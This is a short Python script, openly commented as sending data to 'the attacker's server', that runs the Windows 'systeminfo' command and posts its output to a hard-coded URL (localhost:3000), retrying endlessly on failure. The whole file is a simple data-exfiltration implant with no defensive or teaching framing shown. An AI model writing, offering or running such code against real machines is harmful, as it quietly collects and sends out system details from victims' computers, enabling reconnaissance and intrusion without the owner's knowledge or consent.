import requests
import os 
import time

# URL of the attacker's server
url = "http://localhost:3000"

# Collect system information
data = {
    "info": os.popen("systeminfo").read()
}

def main():
    try:
        # Send collected data to the server
        response = requests.post(url=url, json=data)
        if response.status_code != 200:
            raise "Not ok."
    except:
        # Retry after a delay in case of failure
        time.sleep(3)
        main()

if __name__ == "__main__":
    main()
